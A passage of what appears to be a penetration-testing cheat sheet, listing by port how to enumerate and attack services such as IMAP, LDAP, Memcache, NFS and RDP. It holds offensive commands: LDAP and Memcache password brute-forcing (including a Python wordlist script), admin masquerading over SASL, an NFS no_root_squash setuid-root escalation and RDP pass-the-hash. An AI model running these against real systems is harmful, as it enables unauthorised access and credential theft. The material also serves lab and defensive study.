<li>Input: <code class="codehilite"><span class="o">&lt;</span><span class="n">RandomStringID</span><span class="o">&gt;</span> <span class="n">command</span></code></li>
<li>Response: <code class="codehilite"><span class="o">&lt;</span><span class="n">RandomStringID</span><span class="o">&gt;</span> <span class="n">OK</span> <span class="o">&lt;</span><span class="n">ANSWER</span> <span class="n">DETAIL</span><span class="o">&gt;</span></code></li>
</ul>
</li>
<li>Login<ul>
<li>Login Method: <code class="codehilite"><span class="n">A1</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="n">someuser</span><span class="nv">@example</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="n">My_P</span><span class="nv">@ssword1</span><span class="w"></span></code></li>
<li>When <code class="codehilite"><span class="n">AUTH</span><span class="o">=</span><span class="n">PLAIN</span></code> (SASL PLAIN Method)
  <div class="codehilite"><pre><span></span><span class="n">echo</span><span class="w"> </span><span class="o">-</span><span class="n">en</span><span class="w"> </span><span class="ss">&quot;\0someuser@example.com\0My_P@ssword1&quot;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">openssl</span><span class="w"> </span><span class="n">base64</span><span class="w"></span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="nv">a</span> <span class="nv">authenticate</span> <span class="nv">plain</span>
<span class="o">&lt;</span><span class="k">send</span> <span class="nv">null</span> <span class="nv">separated</span> <span class="nv">encoded</span> <span class="nv">username</span>, <span class="nv">password</span><span class="o">&gt;</span>
</pre></div></li>
<li>When <code class="codehilite"><span class="n">AUTH</span><span class="o">=</span><span class="n">LOGIN</span></code> (SASL AUTH LOGIN)
  <div class="codehilite"><pre><span></span><span class="n">echo</span><span class="w"> </span><span class="o">-</span><span class="n">en</span><span class="w"> </span><span class="ss">&quot;someuser@example.com&quot;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">openssl</span><span class="w"> </span><span class="n">base64</span><span class="w"></span>
<span class="n">echo</span><span class="w"> </span><span class="o">-</span><span class="n">en</span><span class="w"> </span><span class="ss">&quot;My_P@ssword1&quot;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">base64</span><span class="w"></span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="nv">a</span> <span class="nv">AUTHENTICATE</span> <span class="nv">LOGIN</span>
<span class="o">&lt;</span><span class="k">send</span> <span class="nv">encoded</span> <span class="nv">username</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="k">send</span> <span class="nv">encoded</span> <span class="nv">password</span><span class="o">&gt;</span>
</pre></div></li>
<li>SASL PLAIN as an Admin User (Masquerade another user)
  <div class="codehilite"><pre><span></span><span class="n">authcidNULauthzidNULpassword</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="n">echo</span><span class="w"> </span><span class="o">-</span><span class="n">en</span><span class="w"> </span><span class="ss">&quot;someuser@example.com\0admin\0admin1234&quot;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">openssl</span><span class="w"> </span><span class="n">base64</span><span class="w"></span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="nv">a</span> <span class="nv">authenticate</span> <span class="nv">plain</span>
<span class="o">&lt;</span><span class="k">send</span> <span class="nv">encoded</span> <span class="nv">authcidNULauthzidNULpassword</span><span class="o">&gt;</span>
</pre></div></li>
</ul>
</li>
<li>Capability: <code class="codehilite"><span class="n">a</span> <span class="n">capability</span></code></li>
<li>Retrieving Emails and Modifying the Inbox<ul>
<li>Namespaces: <code class="codehilite"><span class="n">n</span> <span class="n">namespace</span></code></li>
<li>Examine Inbox: <code class="codehilite"><span class="n">ex1</span> <span class="n">EXAMINE</span> <span class="n">INBOX</span></code></li>
<li>List of folders
  <div class="codehilite"><pre><span></span><span class="n">LIST</span> <span class="ss">&quot;&lt;mailbox path&gt;&quot;</span> <span class="ss">&quot;&lt;search argument&gt;&quot;</span>
<span class="n">L1</span> <span class="n">list</span> <span class="ss">&quot;INBOX/&quot;</span> <span class="ss">&quot;*&quot;</span>
</pre></div></li>
<li><code class="codehilite"><span class="o">&lt;</span><span class="n">mailbox</span> <span class="n">path</span><span class="o">&gt;</span></code><ul>
<li>if empty list shows all content from root</li>
</ul>
</li>
<li><code class="codehilite"><span class="o">&lt;</span><span class="k">search</span> <span class="n">argument</span><span class="o">&gt;</span></code><ul>
<li>case-sensitive mailbox name with possible wildcards</li>
<li><code class="codehilite"><span class="o">-</span></code> is a wildcard, and matches zero or more characters at this position.</li>
<li><code class="codehilite"><span class="c">%</span></code> is similar to <code class="codehilite"><span class="o">*</span></code> but it does not match a hierarchy delimiter</li>
</ul>
</li>
</ul>
</li>
<li>Fetch Messages
    <div class="codehilite"><pre><span></span><span class="n">f1</span> <span class="k">FETCH</span> <span class="mi">1</span> <span class="n">BODY</span><span class="p">[]</span>
<span class="n">f2</span> <span class="k">fetch</span> <span class="mi">2</span> <span class="n">RFC822</span>
<span class="n">f3</span> <span class="k">fetch</span> <span class="mi">1</span><span class="p">:</span><span class="mi">4</span> <span class="p">(</span><span class="n">BODY</span><span class="p">[</span><span class="n">HEADER</span><span class="p">.</span><span class="n">FIELDS</span> <span class="p">(</span><span class="n">Subject</span><span class="p">)])</span>
</pre></div></li>
<li>Unseen
    <div class="codehilite"><pre><span></span><span class="n">s</span> <span class="k">search</span> <span class="n">UNSEEN</span>
</pre></div></li>
<li>Delete
    <div class="codehilite"><pre><span></span><span class="n">d</span> <span class="n">store</span> <span class="mi">2</span> <span class="o">+</span><span class="n">FLAGS</span> <span class="p">(</span><span class="err">\</span><span class="n">Deleted</span><span class="p">)</span>
<span class="n">e</span> <span class="n">expunge</span>
</pre></div></li>
<li>Example Session
    <div class="codehilite"><pre><span></span><span class="mi">1</span><span class="err">\</span><span class="p">.</span> <span class="n">telnet</span> <span class="n">brainfuck</span><span class="p">.</span><span class="n">htb</span> <span class="mi">143</span>
<span class="mi">2</span><span class="err">\</span><span class="p">.</span> <span class="n">a1</span> <span class="n">LOGIN</span> <span class="n">orestis</span> <span class="n">kHGuERB29DNiNE</span>
<span class="mi">3</span><span class="err">\</span><span class="p">.</span> <span class="n">a2</span> <span class="n">LIST</span> <span class="ss">&quot;&quot;</span> <span class="ss">&quot;*&quot;</span>
<span class="mi">4</span><span class="err">\</span><span class="p">.</span> <span class="n">a3</span> <span class="n">EXAMINE</span> <span class="n">INBOX</span>
<span class="mi">5</span><span class="err">\</span><span class="p">.</span> <span class="n">a4</span> <span class="k">FETCH</span> <span class="mi">1</span> <span class="n">BODY</span><span class="p">[]</span>
<span class="mi">6</span><span class="err">\</span><span class="p">.</span> <span class="n">a5</span> <span class="k">FETCH</span> <span class="mi">2</span> <span class="n">BODY</span><span class="p">[]</span>
</pre></div></li>
</ul>
<p><strong>Tools</strong>
<strong>Hardening</strong>
<strong>References</strong></p>
<h2 id="irc-8067tcp">IRC - 8067/tcp<a class="headerlink" href="#irc-8067tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>Version / Connect
    <div class="codehilite"><pre><span></span>irssi -c <span class="m">10</span>.10.10.117 --port <span class="m">8067</span>
</pre></div></li>
</ul>
<h2 id="ldap-389tcp">LDAP - 389/tcp<a class="headerlink" href="#ldap-389tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>Configuration files
    <div class="codehilite"><pre><span></span><span class="n">containers</span><span class="p">.</span><span class="n">ldif</span>
<span class="n">ldap</span><span class="p">.</span><span class="n">cfg</span>
<span class="n">ldap</span><span class="p">.</span><span class="n">conf</span>
<span class="n">ldap</span><span class="p">.</span><span class="n">xml</span>
<span class="n">ldap</span><span class="o">-</span><span class="n">config</span><span class="p">.</span><span class="n">xml</span>
<span class="n">ldap</span><span class="o">-</span><span class="n">realm</span><span class="p">.</span><span class="n">xml</span>
<span class="n">slapd</span><span class="p">.</span><span class="n">conf</span>
</pre></div></li>
<li>Brute-forcing: <code class="codehilite"><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">389</span> <span class="c1">--script ldap-brute --script-args ldap.base=&#39;&quot;cn=schema,dc=targetbox,dc=target&quot;&#39; (TARGET IP ADDRESS) -vv</span></code></li>
<li>Dump:<ul>
<li><code class="codehilite"><span class="n">ldapdomaindump</span> <span class="o">-</span><span class="n">u</span> <span class="n">example</span><span class="err">\</span><span class="n">example</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span></code></li>
<li><code class="codehilite"><span class="n">ldapsearch</span> <span class="o">-</span><span class="n">LLL</span> <span class="o">-</span><span class="n">x</span> <span class="o">-</span><span class="n">H</span> <span class="n">ldap</span><span class="p">:</span><span class="o">//&lt;</span><span class="k">domain</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">b</span> <span class="ss">&quot;&quot;</span> <span class="o">-</span><span class="n">s</span> <span class="n">base</span> <span class="ss">&quot;(objectclass=*)&quot;</span></code></li>
<li><code class="codehilite"><span class="n">ldapsearch</span> <span class="o">-</span><span class="n">LLL</span> <span class="o">-</span><span class="n">x</span> <span class="o">-</span><span class="n">H</span> <span class="n">ldap</span><span class="p">:</span><span class="o">//&lt;</span><span class="k">domain</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">b</span> <span class="ss">&quot;&quot;</span> <span class="o">-</span><span class="n">s</span> <span class="n">base</span> <span class="ss">&quot;CN=example,DC=LOCAL&quot;</span></code></li>
<li><code class="codehilite"><span class="n">ldapsearch</span> <span class="o">-</span><span class="n">h</span> <span class="n">EGOTISTICAL</span><span class="o">-</span><span class="n">BANK</span><span class="p">.</span><span class="k">LOCAL</span> <span class="o">-</span><span class="n">p</span> <span class="mi">389</span> <span class="o">-</span><span class="n">x</span> <span class="o">-</span><span class="n">b</span> <span class="ss">&quot;DC=EGOTISTICAL-BANK,DC=LOCAL&quot;</span></code></li>
<li><a href="http://jrwren.wrenfam.com/blog/2006/11/17/querying-active-directory-with-unix-ldap-tools/index.html">http://jrwren.wrenfam.com/blog/2006/11/17/querying-active-directory-with-unix-ldap-tools/index.html</a></li>
</ul>
</li>
</ul>
<p><strong>Tools</strong></p>
<ul>
<li>Softerra LDAP Administrator</li>
<li>Jxplorer</li>
<li>active directory domain services management pack for system center</li>
<li>LDAP Admin Tool</li>
<li>LDAP Administrator tool</li>
</ul>
<p><strong>Hardening</strong>
<strong>References</strong></p>
<h2 id="memcache">Memcache<a class="headerlink" href="#memcache" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>Connecting: <code class="codehilite"><span class="n">telnet</span> <span class="n">localhost</span> <span class="mi">11211</span></code></li>
<li>Information gathering<ul>
<li><code class="codehilite"><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">11211</span> <span class="c1">--script memcached-info</span></code></li>
<li><code class="codehilite"><span class="n">memcstat</span> <span class="c1">--servers=127.0.0.1</span></code></li>
</ul>
</li>
<li>Read value
    <div class="codehilite"><pre><span></span>memccat --servers<span class="o">=</span><span class="m">192</span>.64.38.3 --username<span class="o">=</span>user --password<span class="o">=</span>pass flag
</pre></div>
    <div class="codehilite"><pre><span></span>$ nc localhost <span class="m">112111</span>

get password
VALUE password <span class="m">0</span> <span class="m">6</span>
3dw4rd
END
</pre></div></li>
<li>Key information and dump values
    <div class="codehilite"><pre><span></span>&gt; version

&gt; stats items
STAT items:3:number <span class="m">1</span>
STAT items:3:age <span class="m">498</span>
STAT items:22:number <span class="m">1</span>
STAT items:22:age <span class="m">498</span>
END

&gt; stats cachedump &lt;stab-id&gt; &lt;limit&gt;
&gt; stats cachedump <span class="m">3</span> <span class="m">100</span>
ITEM views.decorators.cache.cache_header..cc7d9 <span class="o">[</span><span class="m">6</span> b<span class="p">;</span> <span class="m">1256056128</span> s<span class="o">]</span>
END
</pre></div></li>
<li>Increment decrement
    <div class="codehilite"><pre><span></span><span class="o">&gt;</span> <span class="n">incr</span> <span class="o">&lt;</span><span class="n">id</span><span class="o">&gt;</span> <span class="mi">1</span>
<span class="o">&gt;</span> <span class="n">decr</span> <span class="o">&lt;</span><span class="n">id</span><span class="o">&gt;</span> <span class="mi">1</span>
</pre></div></li>
<li>Set new entry
    <div class="codehilite"><pre><span></span><span class="o">&gt;</span> <span class="k">set</span> <span class="n">phone</span> <span class="mi">0</span> <span class="mi">60</span> <span class="mi">9</span>
<span class="o">&gt;</span> <span class="mi">123456789</span>
</pre></div></li>
<li>Modify value
    <div class="codehilite"><pre><span></span><span class="o">&gt;</span> <span class="k">replace</span> <span class="o">&lt;</span><span class="k">key</span><span class="o">&gt;</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">2</span>
<span class="o">&gt;</span> <span class="o">&lt;</span><span class="k">new</span><span class="o">-</span><span class="n">value</span><span class="o">&gt;</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="o">&gt;</span> <span class="n">prepend</span> <span class="n">address</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">6</span>
<span class="o">&gt;</span> <span class="n">house</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="n">append</span> <span class="n">address</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">6</span>
<span class="p">,</span><span class="mi">73301</span>
</pre></div></li>
<li>Delete
    <div class="codehilite"><pre><span></span><span class="o">&gt;</span> <span class="k">delete</span> <span class="n">old_address</span>
</pre></div>
    <div class="codehilite"><pre><span></span>&gt; flush_all <span class="m">30</span>
<span class="c1"># invalidate all keys after 30 s</span>
</pre></div></li>
<li>Dump all keys
    <div class="codehilite"><pre><span></span><span class="n">memcdump</span> <span class="c1">--verbose --debug --servers=127.0.0.1 | tee keys.lst</span>
</pre></div></li>
<li>Dump all key-values
    <div class="codehilite"><pre><span></span>memcached-tool localhost:11211 dump <span class="p">|</span> less
</pre></div>
    <div class="codehilite"><pre><span></span><span class="k">while</span> <span class="nb">read</span> -r key<span class="p">;</span> <span class="k">do</span>
    <span class="o">[</span> -f <span class="s2">&quot;</span><span class="nv">$key</span><span class="s2">&quot;</span> <span class="o">]</span> <span class="o">||</span> <span class="nb">echo</span> <span class="s2">&quot;get </span><span class="nv">$key</span><span class="s2">&quot;</span> <span class="p">|</span> nc localhost <span class="m">11211</span> &gt; <span class="s2">&quot;</span><span class="nv">$key</span><span class="s2">.dump&quot;</span><span class="p">;</span>
<span class="k">done</span> &lt; &lt;<span class="o">(</span>memcdump --server localhost<span class="o">)</span>
</pre></div>
    <div class="codehilite"><pre><span></span>memcdump --servers<span class="o">=</span>localhost <span class="p">|</span> xargs -L1 -I% sh -c <span class="s1">&#39;echo &quot;get %&quot; | nc localhost 11211&#39;</span>
</pre></div></li>
<li>memcmd
    <div class="codehilite"><pre><span></span><span class="k">function</span> memcmd<span class="o">()</span> <span class="o">{</span>
<span class="nb">exec</span> <span class="o">{</span>memcache<span class="o">}</span>&lt;&gt;/dev/tcp/localhost/11211
<span class="nb">printf</span> <span class="s2">&quot;%s\n%s\n&quot;</span> <span class="s2">&quot;</span><span class="nv">$*</span><span class="s2">&quot;</span> quit &gt;<span class="p">&amp;</span><span class="si">${</span><span class="nv">memcache</span><span class="si">}</span>
cat &lt;<span class="p">&amp;</span><span class="si">${</span><span class="nv">memcache</span><span class="si">}</span>
<span class="o">}</span>
</pre></div><ul>
<li>1.4.31 and above
  <div class="codehilite"><pre><span></span><span class="n">memcmd</span> <span class="n">lru_crawler</span> <span class="n">metadump</span> <span class="k">all</span>
</pre></div></li>
<li>1.4.30 and below
  <div class="codehilite"><pre><span></span><span class="n">memcmd</span> <span class="n">stats</span> <span class="n">items</span>
<span class="n">memcmd</span> <span class="n">stats</span> <span class="n">cachedump</span> <span class="mi">1</span> <span class="mi">0</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="k">for</span> id in <span class="k">$(</span>memcmd stats items <span class="p">|</span> grep -o <span class="s2">&quot;:[0-9]\+:&quot;</span> <span class="p">|</span> tr -d : <span class="p">|</span> sort -nu<span class="k">)</span><span class="p">;</span> <span class="k">do</span>
    memcmd stats cachedump <span class="nv">$id</span> <span class="m">0</span>
<span class="k">done</span>
</pre></div></li>
</ul>
</li>
</ul>
<p><strong>Tools</strong></p>
<ul>
<li>Python Library: <a href="https://github.com/abstatic/python-memcached-stats">https://github.com/abstatic/python-memcached-stats</a></li>
<li>Bruteforce
    <div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/python3</span>
<span class="kn">import</span> <span class="nn">subprocess</span>

<span class="n">dictionary</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/usr/share/wordlists/rockyou.txt&quot;</span><span class="p">)</span>
<span class="k">for</span> <span class="n">pwd</span> <span class="ow">in</span> <span class="n">dictionary</span><span class="p">:</span>
    <span class="n">out</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s1">&#39;memcstat --servers=192.64.38.3 --username=student --password=&#39;</span><span class="o">+</span><span class="n">pwd</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">out</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">&quot;PASSWORD: &quot;</span><span class="o">+</span><span class="n">pwd</span><span class="p">)</span>
        <span class="k">break</span>
</pre></div></li>
</ul>
<p><strong>Hardening</strong>
<strong>References</strong></p>
<h2 id="modbus-502tcp">Modbus - 502/tcp<a class="headerlink" href="#modbus-502tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong>
<strong>Tools</strong></p>
<ul>
<li>Map a SCADA MODBUS TCP based network: <a href="https://packetstormsecurity.com/UNIX/scanners/modscan.py.txt">https://packetstormsecurity.com/UNIX/scanners/modscan.py.txt</a></li>
</ul>
<p><strong>Hardening</strong>
<strong>References</strong></p>
<h2 id="nfs-2049tcp">NFS - 2049/tcp<a class="headerlink" href="#nfs-2049tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>Configuration files
    <div class="codehilite"><pre><span></span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">exports</span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">nfs</span><span class="o">/</span><span class="n">xtab</span>
</pre></div></li>
<li>Enumeration
    <div class="codehilite"><pre><span></span>nmap -sV --script<span class="o">=</span>nfs-* <span class="m">192</span>.168.44.133
nmap -sV --script<span class="o">=</span>nfs-ls <span class="m">192</span>.168.44.133  //same result as rpcinfo
nmap -sV --script<span class="o">=</span>nfs-* <span class="m">192</span>.168.44.133
</pre></div></li>
<li>Enumerate NFS shares: <code class="codehilite"><span class="n">showmount</span> <span class="o">-</span><span class="n">e</span> <span class="n">hostname</span><span class="o">/</span><span class="n">ip_address</span></code></li>
<li>Mount NFS shares:
    <div class="codehilite"><pre><span></span>mount -t nfs ip_address:/directory_found_exported /local_mount_point
mount -t nfs <span class="m">192</span>.168.1.72:/home/vulnix /tmp/mnt -nolock
</pre></div></li>
<li><code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">exports</span></code> file contains configurations and permissions of which folders/file systems are exported to remote users</li>
<li>Root squashing - Prevents having root access to remote root users connected to NFS volume. Remote root users are assigned a user "nfsnobody" when connected.<ul>
<li><a href="https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/">https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/</a></li>
<li><code class="codehilite"><span class="n">no_root_squash</span></code> - Gives the remote user root access to the connected system<ul>
<li>With limited user account: <code class="codehilite"><span class="n">cp</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span> <span class="o">/</span><span class="n">shared</span></code></li>
<li>Then mount the share: <code class="codehilite"><span class="n">mount</span> <span class="o">-</span><span class="n">t</span> <span class="n">nfs</span> <span class="n">server</span><span class="p">:</span><span class="o">/</span><span class="n">shared</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span></code> and run <code class="codehilite"><span class="n">chown</span> <span class="n">root</span><span class="p">:</span><span class="n">root</span> <span class="n">bash</span> <span class="o">&amp;&amp;</span> <span class="n">chmod</span> <span class="n">u</span><span class="o">+</span><span class="n">s</span> <span class="n">bash</span></code></li>
<li>Run the file with limited user account: <code class="codehilite"><span class="o">/</span><span class="n">shared</span><span class="o">/</span><span class="n">bash</span></code></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>Tools</strong></p>
<ul>
<li>NFS shell - <a href="https://github.com/NetDirect/nfsshell">https://github.com/NetDirect/nfsshell</a><ul>
<li>Provides user level access to an NFS server, over UDP or TCP, supports source routing and "secure" (privileged port) mounts.
  <div class="codehilite"><pre><span></span>nfsshell&gt; host &lt;ip&gt;
nfsshell&gt; mount &lt;name of the share&gt;
nfsshell&gt; gid <span class="m">1000</span>
nfsshell&gt; uid <span class="m">1000</span>
nfsshell&gt; put example
nfsshell&gt; chmod <span class="m">0777</span> example
</pre></div></li>
</ul>
</li>
</ul>
<p><strong>Hardening</strong>
<strong>References</strong></p>
<ul>
<li><a href="http://linuxadministrative.blogspot.com/2014/09/showmount-command-examples.html">http://linuxadministrative.blogspot.com/2014/09/showmount-command-examples.html</a></li>
<li>Exploiting Network File System, (NFS), shares: <a href="http://www.vulnerabilityassessment.co.uk/nfs.htm">http://www.vulnerabilityassessment.co.uk/nfs.htm</a></li>
</ul>
<h2 id="ntp-123tcp">NTP - 123/tcp<a class="headerlink" href="#ntp-123tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>Configuration files
    <div class="codehilite"><pre><span></span><span class="n">ntp</span><span class="p">.</span><span class="n">conf</span>
</pre></div></li>
</ul>
<p><strong>Tools</strong></p>
<ul>
<li>ntptrace - Query to determine from where the NTP server updates its time and traces the chain of NTP servers from a source</li>
<li>ntpdc - Query the ntp Deamon about its current state and to request changes in the state
    <div class="codehilite"><pre><span></span><span class="n">ntpdc</span> <span class="o">-</span><span class="k">c</span> <span class="n">monlist</span> <span class="n">IP_ADDRESS</span>
<span class="n">ntpdc</span> <span class="o">-</span><span class="k">c</span> <span class="n">sysinfo</span> <span class="n">IP_ADDRESS</span>
</pre></div></li>
<li>ntpq - Monitors NTP daemon ntpd operations and determine performance</li>
</ul>
<p><strong>Hardening</strong></p>
<ul>
<li>NTPSec</li>
<li>IPTables</li>
<li>logging</li>
</ul>
<p><strong>References</strong></p>
<h2 id="pop3-110tcp">POP3 - 110/tcp<a class="headerlink" href="#pop3-110tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>Login
    <div class="codehilite"><pre><span></span><span class="k">USER</span> <span class="n">username</span>
<span class="n">PASS</span> <span class="n">password</span>
</pre></div></li>
</ul>
<p>Other commands</p>
<table>
<thead>
<tr>
<th align="left">Command</th>
<th align="left">Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td align="left">USER</td>
<td align="left">Your user name for this mail server</td>
</tr>
<tr>
<td align="left">PASS</td>
<td align="left">Your password.</td>
</tr>
<tr>
<td align="left">QUIT</td>
<td align="left">End your session.</td>
</tr>
<tr>
<td align="left">STAT</td>
<td align="left">Number and total size of all messages</td>
</tr>
<tr>
<td align="left">LIST</td>
<td align="left">Message# and size of message</td>
</tr>
<tr>
<td align="left">RETR</td>
<td align="left">message#   Retrieve selected message</td>
</tr>
<tr>
<td align="left">DELE</td>
<td align="left">message#   Delete selected message</td>
</tr>
<tr>
<td align="left">NOOP</td>
<td align="left">No-op. Keeps you connection open.</td>
</tr>
<tr>
<td align="left">RSET</td>
<td align="left">Reset the mailbox. Undelete deleted messages.</td>
</tr>
<tr>
<td align="left">TOP 1 0</td>
<td align="left">Return headers only</td>
</tr>
<tr>
<td align="left">TOP 1 10</td>
<td align="left">Return headers and first 10 lines of body</td>
</tr>
</tbody>
</table>
<p><strong>Tools</strong>
<strong>Hardening</strong>
<strong>References</strong></p>
<h2 id="pptp-l2tp-vpn-500tcp-1723tcp">PPTP-L2TP-VPN - 500/tcp 1723/tcp<a class="headerlink" href="#pptp-l2tp-vpn-500tcp-1723tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong>
<strong>Tools</strong>
<strong>Hardening</strong>
<strong>References</strong></p>
<ul>
<li><a href="http://0daysecurity.com/penetration-testing/enumeration.html">http://0daysecurity.com/penetration-testing/enumeration.html</a></li>
<li>PSK Cracking using IKE Aggressive Mode: <a href="http://www.ernw.de/download/pskattack.pdf">http://www.ernw.de/download/pskattack.pdf</a></li>
<li>Penetration Testing IPsec VPNs: <a href="https://www.symantec.com/connect/articles/penetration-testing-ipsec-vpns">https://www.symantec.com/connect/articles/penetration-testing-ipsec-vpns</a></li>
<li>Scanning and probing a VPN (ikescan): <a href="https://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf">https://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf</a></li>
</ul>
<h2 id="rdp-3389tcp">RDP - 3389/tcp<a class="headerlink" href="#rdp-3389tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>PTH: <code class="codehilite"><span class="n">xfreerdp</span> <span class="o">/</span><span class="n">u</span><span class="p">:</span><span class="n">testing</span> <span class="o">/</span><span class="n">d</span><span class="p">:</span><span class="n">thinc</span> <span class="o">/</span><span class="n">pth</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span> <span class="o">/</span><span class="n">v</span><span class="p">:</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">23</span></code></li>
</ul>
<p><strong>Tools</strong></p>
<ul>
<li>List the RDP Connections History: <a href="https://github.com/3gstudent/List-RDP-Connections-History">https://github.com/3gstudent/List-RDP-Connections-History</a></li>
</ul>
<p><strong>Hardening</strong>
<strong>References</strong></p>
<ul>
<li>RDP hijacking — how to hijack RDS and RemoteApp sessions transparently to move through an organisation: <a href="https://doublepulsar.com/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6">https://doublepulsar.com/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6</a></li>
</ul>
<h2 id="rlogin-513tcp">rlogin - 513/tcp<a class="headerlink" href="#rlogin-513tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>Locating files
    <div class="codehilite"><pre><span></span><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">name</span> <span class="p">.</span><span class="n">rhosts</span>
<span class="n">locate</span> <span class="p">.</span><span class="n">rhosts</span>
</pre></div></li>
<li>Manual login: <code class="codehilite"><span class="n">rlogin</span> <span class="n">hostname</span> <span class="o">-</span><span class="n">l</span> <span class="n">username</span></code></li>
</ul>
<p><strong>Tools</strong>
<strong>Hardening</strong>
<strong>References</strong></p>
<ul>
<li><a href="http://0daysecurity.com/penetration-testing/enumeration.html">http://0daysecurity.com/penetration-testing/enumeration.html</a></li>
</ul>
<h2 id="smb-samba-netbios-137udp-138udp-137tcp-139tcp-445tcp">SMB-Samba-NetBIOS - (137/udp 138/udp), (137/tcp 139/tcp), 445/tcp<a class="headerlink" href="#smb-samba-netbios-137udp-138udp-137tcp-139tcp-445tcp" title="Permanent link">&para;</a></h2>
<h3 id="quick-reference">Quick Reference<a class="headerlink" href="#quick-reference" title="Permanent link">&para;</a></h3>
<h4 id="summary">Summary<a class="headerlink" href="#summary" title="Permanent link">&para;</a></h4>
<ul>
<li>Summary<ul>
<li>In computer networking, <code class="codehilite"><span class="n">Server</span> <span class="n">Message</span> <span class="n">Block</span> <span class="p">(</span><span class="n">SMB</span><span class="p">)</span></code>, one version of which was also known as <code class="codehilite"><span class="n">Common</span> <span class="n">Internet</span> <span class="n">File</span> <span class="k">System</span> <span class="p">(</span><span class="n">CIFS</span><span class="p">)</span></code>, operates as an <code class="codehilite"><span class="n">application</span><span class="o">-</span><span class="n">layer</span> <span class="n">network</span> <span class="n">protocol</span></code>. </li>
<li>Mainly used for providing shared access to <code class="codehilite"><span class="n">files</span></code>, <code class="codehilite"><span class="n">printers</span></code>, and <code class="codehilite"><span class="nb">serial</span> <span class="n">ports</span></code> and <code class="codehilite"><span class="n">miscellaneous</span> <span class="n">communications</span> <span class="k">between</span> <span class="n">nodes</span></code> on a network. </li>
<li>It also provides an <code class="codehilite"><span class="n">authenticated</span> <span class="n">inter</span><span class="o">-</span><span class="n">process</span> <span class="n">communication</span></code> mechanism. </li>
<li>Most usage of SMB involves computers running Microsoft Windows, where it was known as "<code class="codehilite"><span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">Network</span></code>" before the subsequent introduction of <code class="codehilite"><span class="n">Active</span> <span class="n">Directory</span></code>. </li>
<li>Corresponding Windows services are <code class="codehilite"><span class="n">LAN</span> <span class="n">Manager</span> <span class="n">Server</span></code> (for the server component) and <code class="codehilite"><span class="n">LAN</span> <span class="n">Manager</span> <span class="n">Workstation</span></code> (for the client component).</li>
</ul>
</li>
<li>SMB can run on top of the session (and lower) network layers in several ways:<ul>
<li>Directly over <code class="codehilite"><span class="n">TCP</span><span class="p">,</span> <span class="n">port</span> <span class="mi">445</span></code> via the <code class="codehilite"><span class="n">NetBIOS</span> <span class="n">API</span></code>, which in turn can run on several transports.</li>
